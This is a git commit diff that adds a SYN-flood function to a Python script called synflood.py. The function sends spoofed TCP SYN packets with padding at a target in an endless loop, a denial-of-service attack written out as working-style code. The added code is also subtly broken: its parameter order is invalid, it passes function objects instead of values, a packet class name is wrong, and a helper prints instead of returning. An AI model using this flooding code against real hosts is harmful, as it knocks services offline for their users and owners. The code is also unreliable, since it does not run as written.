a4743baa1b4975d1a10d5875f7f64564b09626c2
Lorenzo Cunial <99892625+d3uk4li0n@users.noreply.github.com>
2024-02-15 10:57:15 +0100

    Update synflood.py

--- synflood.py
+++ synflood.py
@@ -9,3 +9,12 @@ def random_ip():
 
 def random_port():
     print(random.randrange(65535))
+
+def syn_flood(source=random_ip, target, tgt_port=random_port, v=0):
+    ip = IP(src=source, dst=target)
+    tcp = TCP(sport=random_port, dport=tgt_port, flags="S")
+    raw_pkt = RAW(b"X"*1024)
+    pkt = ip/tcp/raw_pkt
+    print(f"{Fore.GREEN}Flooding the target...")
+
+    send(pkt, loop=1, verbose=v)
